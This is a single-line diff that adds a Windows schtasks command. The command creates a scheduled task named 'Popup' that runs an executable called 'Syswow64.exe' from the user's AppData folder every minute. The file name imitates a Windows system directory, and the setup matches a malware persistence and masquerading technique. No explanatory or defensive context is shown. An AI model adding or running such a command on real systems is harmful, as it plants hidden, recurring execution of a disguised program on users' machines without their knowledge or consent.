@@ -1,0 +1,1 @@
+schtasks /create /tn "Popup" /sc minute /mo 1 /tr "%appdata%/Syswow64.exe"
